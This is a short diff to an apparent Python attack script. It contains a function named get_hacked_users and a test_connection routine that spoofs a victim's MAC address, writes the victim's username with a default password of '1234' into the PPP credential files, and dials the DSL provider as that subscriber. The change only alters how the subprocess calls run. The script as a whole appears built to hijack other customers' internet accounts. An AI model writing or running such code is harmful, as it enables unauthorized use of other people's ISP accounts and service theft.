@@ -59,15 +59,16 @@ def get_hacked_users():
 
 
 def test_connection(user: User):
-    subprocess.call(['sudo', 'poff', '-a'],shell=True)
-    subprocess.call(['sudo', 'ifconfig', 'eth0', 'down'],shell=True)
-    subprocess.call(['sudo', 'macchanger', '-m', user.mac, 'eth0'],shell=True)
-    subprocess.call(['sudo', 'ifconfig', 'eth0', 'up'],shell=True)
+    print(str(user))
+    subprocess.call(['sudo', 'poff', '-a'],stdout=subprocess.PIPE)
+    subprocess.call(['sudo', 'ifconfig', 'eth0', 'down'],stdout=subprocess.PIPE)
+    subprocess.call(['sudo', 'macchanger', '-m', user.mac, 'eth0'],stdout=subprocess.PIPE)
+    subprocess.call(['sudo', 'ifconfig', 'eth0', 'up'],stdout=subprocess.PIPE)
     with open('/etc/ppp/peers/dsl-provider', 'w') as f:
         f.write(DSL.format(user.username))
     with open('/etc/ppp/chap-secrets', 'w') as f:
         f.write(f'"{user.username}" * "1234"')
-    subprocess.call(['sudo', 'pon', 'dsl-provider'],shell=True)
+    subprocess.call(['sudo', 'pon', 'dsl-provider'],stdout=subprocess.PIPE)
 
     connected = False
     retry = 5
